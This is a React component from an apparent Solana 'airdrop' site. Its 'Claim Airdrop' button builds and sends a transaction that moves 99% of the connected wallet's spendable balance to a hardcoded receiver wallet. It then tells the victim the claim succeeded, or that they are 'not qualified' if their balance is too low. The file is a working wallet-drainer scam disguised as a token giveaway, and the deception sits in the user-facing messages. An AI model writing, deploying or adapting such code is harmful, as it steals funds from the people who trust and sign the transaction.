// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { publicKey, sendTransaction } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !sendTransaction) return;

    setLoading(true);
    try {
      const connection = new Connection(RPC_URL);
      const balance = await connection.getBalance(publicKey);
      const minBalance = await connection.getMinimumBalanceForRentExemption(0);
      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
      const usable = balance - minBalance - TRANSFER_FEE_BUFFER;

      if (balance < minBalance + TRANSFER_FEE_BUFFER + minimumQualifyingLamports || usable <= 0) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const transferAmount = Math.floor(usable * 0.99);

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      const txid = await sendTransaction(transaction, connection);
      await connection.confirmTransaction(txid);

      console.log('✅ Transaction confirmed:', txid);
      alert(`Claim successful!\nTx: ${txid}`);
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: You are not qualified for this Airdrop');
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction]);

  if (!publicKey) return null;

  // src/components/TransferButton.jsx
return (
  <button
    onClick={handleTransfer}
    disabled={loading}
    className={`
      w-full py-3 px-4 rounded-lg font-semibold transition
      ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
      ${className}
    `}
  >
    {loading ? 'Claiming...' : 'Claim Airdrop'}
  </button>
);

}
